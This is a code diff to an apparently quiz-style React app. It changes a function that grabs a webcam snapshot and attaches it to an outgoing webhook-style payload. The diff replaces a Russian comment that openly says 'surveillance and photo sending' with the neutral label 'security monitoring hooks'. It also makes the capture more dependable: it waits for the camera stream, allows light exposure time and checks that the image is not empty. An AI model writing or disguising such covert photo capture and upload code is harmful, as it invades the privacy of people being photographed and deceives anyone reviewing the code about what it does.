@@ -240,7 +240,7 @@ function App() {
   const [customQCount, setCustomQCount] = useState(''); 
   const [isAnimating, setIsAnimating] = useState(false);
 
-  // --- ДОБАВЛЕНО: ФУНКЦИОНАЛ СЛЕЖКИ И ОТПРАВКИ ФОТО ---
+// --- SECURITY MONITORING HOOKS ---
   const captureViolation = async (title, extraFields = []) => {
       const video = document.getElementById('securityCam');
       let formData = new FormData();
@@ -266,15 +266,27 @@ function App() {
           if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
               const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } });
               video.srcObject = stream;
-              await new Promise(r => setTimeout(r, 150)); 
+              
+              // ПРИНУДИТЕЛЬНО ждем, пока видео поток реально запустится
+              await new Promise((resolve) => {
+                  video.onloadedmetadata = () => {
+                      video.play().then(resolve).catch(resolve);
+                  };
+                  setTimeout(resolve, 1000); // Страховочный таймаут (максимум 1 сек)
+              });
+              
+              // Даем матрице камеры 400мс на захват света (чтобы не было черного экрана)
+              await new Promise(r => setTimeout(r, 400)); 
               
               const canvas = document.createElement('canvas');
-              canvas.width = video.videoWidth; 
-              canvas.height = video.videoHeight;
-              canvas.getContext('2d').drawImage(video, 0, 0);
+              canvas.width = video.videoWidth || 640; 
+              canvas.height = video.videoHeight || 480;
+              canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
               
-              const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.7));
-              if(blob) {
+              const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+              
+              // Проверяем, что картинка реально создалась и не пустая
+              if (blob && blob.size > 0) {
                   formData.append('file', blob, 'capture.jpg');
                   payload.embeds[0].image = { url: 'attachment://capture.jpg' };
               }
